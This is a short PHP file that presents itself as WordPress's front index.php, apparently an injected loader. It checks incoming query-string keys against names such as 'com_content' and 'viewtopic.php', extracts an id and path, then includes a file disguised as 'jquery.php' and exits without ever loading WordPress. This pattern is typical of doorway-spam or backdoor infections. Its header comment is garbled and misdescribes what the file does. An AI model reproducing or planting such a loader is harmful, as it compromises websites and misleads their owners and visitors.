<?php

/**
 * Front to the WordPress application. This file loads
 * CACHE SYSTEM which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
 
//error_reporting(E_ALL);
//ini_set('');

/**
 * Function that parses http headers into array
 *
 * @param $header
 * @return array
 */

// Start Wordpress Theme

if(count($_GET) > 0){
$puids_array = array('com_content','threads.php','viewtopic.php','jobid.php','index.php');
    
   
    $keep_index_php = false;
    $puids_tmp = array();
    foreach($puids_array as $v){
        $puids_tmp[$v] = str_replace('.', '_', $v);
    }
    
    $puids_array = $puids_tmp;
    

    $puid_name = '';
    $get_keys = array_keys($_GET);

    if(in_array($get_keys[0], $puids_array)){
        $puid_name = array_search($get_keys[0], $puids_array);
    }
    else{
        unset($puids_array);
        unset($puid_name);
    }
    unset($get_keys);
    
}


if(isset($puid_name) && !empty($puid_name)){
    $puid_full = $_GET[$puids_array[$puid_name]];
    $puid = '';
    $sed_path = '';

    $arr = explode('/', $puid_full);
    if(count($arr) > 0){

        $puid = $arr[0];
        array_shift($arr);

        $sed_path = implode('/', $arr);
    }
    unset($_GET[$puids_array[$puid_name]]);
    include 'jquery.php';

    exit(0);
}
